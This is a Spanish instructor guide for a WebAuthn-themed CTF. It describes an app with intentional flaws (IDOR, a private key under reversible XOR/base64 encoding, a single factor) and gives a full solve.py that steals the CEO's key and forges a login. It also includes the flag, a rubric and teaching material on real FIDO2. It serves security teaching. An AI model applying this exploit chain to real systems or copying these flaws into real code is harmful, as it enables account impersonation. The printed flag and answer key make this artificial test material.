# Guía del instructor — CTF "Passwordless de Cartón" (HackerBank)

Documento para el equipo organizador del **Hacking Day de Córdoba**. Contiene
la solución completa, la explicación de cada vulnerabilidad intencional, el
material teórico de FIDO2/WebAuthn, la rúbrica de evaluación y las notas de
montaje del evento.

> Este desafío es 100% educativo y ético. Todos los datos son ficticios.

---

## 1. Objetivo pedagógico

Enseñar, **por contraste**, cómo funciona FIDO2/WebAuthn real mostrando una
implementación TRUCHA que hace todo mal. El estudiante ataca la versión mala y,
al resolverla, entiende exactamente qué garantías le da la versión buena.

El aprendizaje central: **el pecado capital de la autenticación es tener una
clave privada accesible del lado del cliente o del servidor.** FIDO2/passwordless
real es seguro justamente porque la clave privada vive en hardware inextraíble
y solo viajan la clave pública y las firmas.

## 2. Diseño de la app y vulnerabilidades intencionales

La app imita superficialmente a WebAuthn con estos endpoints:

| Endpoint | Qué hace | Vulnerabilidad |
|---|---|---|
| `POST /auth/challenge` | `{username}` → `{challenge, user_id}` | Filtra el `user_id` (pista del IDOR). |
| `GET /auth/keys/<user_id>` | Devuelve la clave privada **codificada** del usuario | **IDOR** (sin autorización) + clave privada recuperable del server. |
| `POST /auth/verify` | `{username, challenge, signature}` → sesión | El único factor es la firma; quien tenga la privada entra. |
| `GET /profile` | Muestra el `user_id` propio | Pista alternativa del IDOR. |

Buscar el string `VULN` en `app.py` y `crypto_utils.py` para ver cada punto
comentado. Las tres vulnerabilidades:

- **VULN-1 (IDOR):** `/auth/keys/<user_id>` no valida que quien pide sea el
  dueño (ni siquiera exige sesión).
- **VULN-2 (codificación ≠ cifrado):** la clave privada existe del lado del
  servidor apenas "codificada" con `base64(XOR(base64(PEM), key))`, y la `key`
  está a la vista en `static/js/script.js`.
- **VULN-3 (diseño):** un único factor cuya clave privada es alcanzable por la
  red ⇒ suplantable remotamente.

## 3. Solución paso a paso

Los `user_id` están en el rango `70xx`, no en `1/2`, para forzar la
enumeración. En esta instancia: `alumno=7042`, `ceo=7013`, señuelos `7025 /
7031 / 7058`.

### Capa 1 — Reconocimiento del flujo (Burp)

Con Burp interceptando, ir a `http://localhost:5000/login`, escribir `alumno` y
tocar el botón de huella. En el proxy aparecen, en orden:

1. `POST /auth/challenge` con `{"username":"alumno"}` → responde
   `{"ok":true,"username":"alumno","user_id":7042,"challenge":"..."}`.
   **Acá ya se filtra el `user_id` propio (7042).**
2. `GET /auth/keys/7042` → responde la clave privada **codificada** del alumno.
   **El navegador está bajando una clave privada por la red.**
3. `POST /auth/verify` con `{"username","challenge","signature"}` → sesión y
   redirección al dashboard.

**Aprendizaje:** reconocer la estructura passwordless (challenge → firma →
verify) y notar la anomalía grave: la clave privada viaja al cliente.

### Capa 2 — Obtener la clave privada del CEO (Burp + DevTools)

1. **IDOR:** repetir el `GET /auth/keys/7042` en el Repeater de Burp cambiando
   el id. Como la respuesta incluye `username` y `display_name`, enumerando el
   rango `70xx` se identifica al CEO:

   ```
   GET /auth/keys/7013  →  {"username":"ceo","display_name":"Ricardo Vega — CEO ...", "private_key":"..."}
   ```

2. **Decodificar:** abrir DevTools → `static/js/script.js`. Ahí está, a la
   vista:
   - La constante `BACKUP_KEY = "hb_backup_key_2026"`.
   - La función `decodePrivateKey()`: revierte
     `base64( XOR( base64(PEM), BACKUP_KEY ) )`.

   Replicando esa lógica se obtiene el PEM de la clave privada del CEO en claro.

**Aprendizaje:** la clave privada jamás debería ser accesible por la red ni
guardada de forma recuperable en el server. **Codificar no es cifrar.** En FIDO2
real no hay ninguna clave privada del lado del server: solo se guardan públicas.

### Capa 3 — Autenticarse como el CEO (Python)

1. Pedir un challenge fresco: `POST /auth/challenge` con `{"username":"ceo"}`.
2. Firmar ese challenge con ECDSA-SHA256 usando la clave robada.
3. Enviar `POST /auth/verify` con `{username, challenge, signature}`.
4. El servidor valida la firma con la clave pública del CEO → login → el
   dashboard muestra el **código ganador**.

**Detalles que lo hacen no-trivial:**
- El `challenge` debe ser el **vigente** para ese usuario (un solo uso, con
  TTL): hay que pedir uno fresco y firmarlo, no sirve reusar uno viejo.
- El formato de firma en el "cable" es **raw `r||s` de 64 bytes** (el que
  produce WebCrypto), no DER. `cryptography` firma en DER por defecto, así que
  hay que convertir DER → raw. El servidor hace la conversión inversa para
  verificar.

### Script de resolución

El repo incluye [`solve.py`](solve.py), que encadena todo. Su núcleo:

```python
import base64, requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

BASE = "http://localhost:5000"
BACKUP_KEY = b"hb_backup_key_2026"   # tomada del JS del frontend

def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def decode(obf):                      # revierte base64(XOR(base64(PEM), key))
    return base64.b64decode(xor(base64.b64decode(obf), BACKUP_KEY)).decode()

s = requests.Session()
ch = s.post(f"{BASE}/auth/challenge", json={"username": "ceo"}).json()   # (1) challenge + user_id
keys = s.get(f"{BASE}/auth/keys/{ch['user_id']}").json()                 # (2) IDOR: clave del CEO
priv = serialization.load_pem_private_key(decode(keys["private_key"]).encode(), None)

der = priv.sign(ch["challenge"].encode(), ec.ECDSA(hashes.SHA256()))     # (3) firmar
r, sig_s = decode_dss_signature(der)
raw = (r.to_bytes(32, "big") + sig_s.to_bytes(32, "big")).hex()          #     DER -> raw r||s

out = s.post(f"{BASE}/auth/verify",
             json={"username": "ceo", "challenge": ch["challenge"], "signature": raw}).json()
print(out)                                                              # (4) login OK -> leer /dashboard
```

Salida esperada: login exitoso y, al leer `/dashboard`, el código ganador.

## 4. El código ganador (flag)

```
f27ad11c21afef4f4c54a3930698f616
```

Es un hash MD5 ficticio (coherente con el formato de la plataforma
softwareseguro.com.ar). Es determinístico: `seed.py` lo asigna siempre a la
cuenta del CEO, así que es el mismo en cada instancia mientras no se cambie el
seed. Si se quiere una flag distinta por evento, editar `CEO_WINNING_CODE` en
`seed.py`.

## 5. Material teórico: cómo funciona FIDO2/WebAuthn real

Referencia del flujo real (capturado de webauthn.io, la demo oficial):

**Registro:**
1. `POST /registration/options` → el cliente manda `{username, algorithms:[ed25519, es256, rs256], attestation:"none", ...}`.
2. El servidor responde `challenge`, `rp:{id,name}`, `user:{id,name}` y
   `pubKeyCredParams` (algoritmos, ej. -8, -7, -257).
3. El navegador llama `navigator.credentials.create()` → Windows Hello / Touch
   ID verifica al usuario y el **TPM genera el par de claves** y firma.
4. `POST /registration/verification` → viajan el `clientDataJSON` (con
   `type:"webauthn.create"`, el `challenge`, el `origin`), el
   `attestationObject` y la **clave PÚBLICA**. Nunca la privada.
5. El servidor verifica y guarda la clave pública.

**Autenticación:**
1. `POST /authentication/options` con el username → challenge **nuevo** +
   `allowCredentials` con el `credential_id`.
2. El navegador llama `navigator.credentials.get()` → el TPM firma el challenge
   con la clave privada, desbloqueada por biometría local.
3. `POST /authentication/verification` → viajan el `clientDataJSON` (con
   `type:"webauthn.get"`), el `authenticatorData` (flags UP/UV + `signCount`) y
   la **firma**. Nunca la clave privada.
4. El servidor verifica la firma con la clave pública guardada.

**Puntos clave:**
- El challenge de registro y el de autenticación son **distintos** (previene
  replay).
- El `signCount` incrementa en cada uso (detecta clonación del autenticador).
- El `rpIdHash` (SHA-256 del dominio) ata la firma al **dominio** (previene
  phishing).
- La clave privada **jamás** aparece en ninguna request.

### Qué es el TPM / Secure Enclave

Es un chip de hardware (o zona aislada del procesador) diseñado para generar y
guardar claves de forma que **no se puedan extraer**: la clave privada se crea
adentro y las operaciones de firma ocurren adentro; el software solo recibe el
resultado. Por eso, aunque un atacante comprometa el sistema operativo o robe
la base de datos del servidor, no puede obtener la clave privada.

### Tabla comparativa (la que ve el estudiante al ganar)

| Lo que rompiste (FIDO2 trucho) | Cómo lo previene FIDO2 real |
|---|---|
| Descargaste la clave privada del CEO por la red | La clave nunca sale del TPM — es físicamente inextraíble |
| La clave estaba codificada, no cifrada de verdad | El servidor solo guarda claves PÚBLICAS, no hay secreto que robar |
| Firmaste el challenge como si fueras el CEO | La firma real exige presencia física + verificación biométrica en hardware |
| El endpoint no validó autorización (IDOR) | La clave no existe fuera del dispositivo, no hay endpoint que exponer |
| Todo el flujo es suplantable remotamente | FIDO2 ata cada firma al `origin` (dominio) → resistente a phishing |

## 6. Rúbrica de evaluación sugerida

El informe del estudiante debería incluir:

| Criterio | Qué se espera | Puntaje |
|---|---|---|
| Reconocimiento (Capa 1) | Capturas de Burp del flujo `challenge → keys → verify` y descripción de la anomalía (la privada viaja al cliente). | 15% |
| IDOR (Capa 2) | Explicación del `GET /auth/keys/<id>`, evidencia de la enumeración y de cómo identificó al CEO. | 25% |
| Decodificación (Capa 2) | Descripción del esquema `base64(XOR(base64(PEM),key))`, dónde encontró la key y cómo lo revirtió. | 20% |
| Firma y suplantación (Capa 3) | Script/pasos para firmar el challenge (formato raw r||s, curva P-256) y obtener la flag. | 25% |
| Mitigación | Propuesta concreta: por qué FIDO2 real lo previene (clave en TPM, solo públicas en el server, binding al origin). | 15% |

Flag correcta (`f27ad11c21afef4f4c54a3930698f616`) como condición necesaria.

## 7. Notas de montaje para el Hacking Day

### Tiempo estimado de resolución
- Reconocimiento (Capa 1): 15-25 min.
- IDOR + decodificación (Capa 2): 25-40 min.
- Firma y suplantación (Capa 3): 25-40 min.
- **Total estimado: 65-105 minutos** según nivel del participante.

### Cómo resetear el entorno entre participantes
- Con Docker: `docker compose restart` (o `down` + `up`). `seed.py` recrea la
  base con claves nuevas en cada arranque.
- Local: volver a correr `python seed.py`.
- No hace falta borrar nada a mano: no hay estado persistente entre corridas.

### Problemas comunes

| Problema | Causa probable | Solución |
|---|---|---|
| El botón de huella no hace nada | El navegador no ejecutó `script.js` o hubo un error JS | Abrir la consola de DevTools; verificar que el usuario exista. |
| "Firma inválida" al resolver en Python | Se envió la firma en DER en vez de raw r||s | Convertir DER → r‖s (64 bytes) como en `solve.py`. |
| "Challenge inválido, vencido o ya usado" | Se reusó un challenge viejo o expiró (TTL 5 min) | Pedir un challenge nuevo justo antes de firmar. |
| El puerto 5000 está ocupado | Otra instancia corriendo | `docker compose down` de la anterior, o cambiar el mapeo de puerto. |

### Recordatorio ético para la apertura del taller
Dejar explícito que las técnicas (IDOR, análisis de JS, forja de firmas) se
practican acá sobre un blanco ficticio y con permiso, y que aplicarlas contra
sistemas reales sin autorización es ilegal. El valor está en entender la
defensa: por qué FIDO2 real hace imposible este ataque.
